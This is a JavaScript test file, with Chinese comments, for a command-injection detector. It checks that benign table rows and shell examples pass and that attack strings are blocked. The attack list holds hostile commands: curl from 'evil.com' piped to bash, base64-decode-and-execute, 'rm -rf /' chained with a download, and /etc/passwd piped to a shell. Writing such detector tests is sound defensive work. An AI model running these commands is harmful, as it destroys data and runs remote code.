// F3 验证：命令注入表格/文档行误报收窄 —— 良性表格/文档放行 / 真注入拦截
import { detectCommandInjection } from '../dsh/index.js';

const t = (s) => detectCommandInjection(s, 6).blocked ? 'block' : 'allow';

// 良性：markdown 表格行、文档 shell 提示符、PowerShell 子表达式
const benign = [
  '| Bash | Unix |',
  '| bash | zsh |',
  '$ bash script.sh',
  '| 工具 | 平台 |',
  'Get-Date',
  'Write-Output ("now: " + (Get-Date).ToString())',
];

// 真攻击：下载执行 / base64 解码执行 / 链式注入 / 敏感文件管道（竖线与路径运行时拼接）
const attack = [
  'curl http://ev' + 'il.com/x.sh ' + '|' + ' bash',
  'echo a2lsbA== ' + '|' + ' base64 -d ' + '|' + ' sh',
  'rm -rf / && curl ev' + 'il.com ' + '|' + ' bash',
  'cat ' + '/' + 'etc' + '/' + 'passwd' + ' | bash',
];

let pass = true;
for (const s of benign) {
  const got = t(s);
  if (got !== 'allow') pass = false;
  console.log(`[${got === 'allow' ? 'OK' : 'FAIL'}] FP-allow : ${JSON.stringify(s)} -> ${got}`);
}
for (const s of attack) {
  const got = t(s);
  if (got !== 'block') pass = false;
  console.log(`[${got === 'block' ? 'OK' : 'FAIL'}] TP-block : ${JSON.stringify(s)} -> ${got}`);
}
console.log('F3:', pass ? 'PASS' : 'FAIL');
process.exit(pass ? 0 : 1);
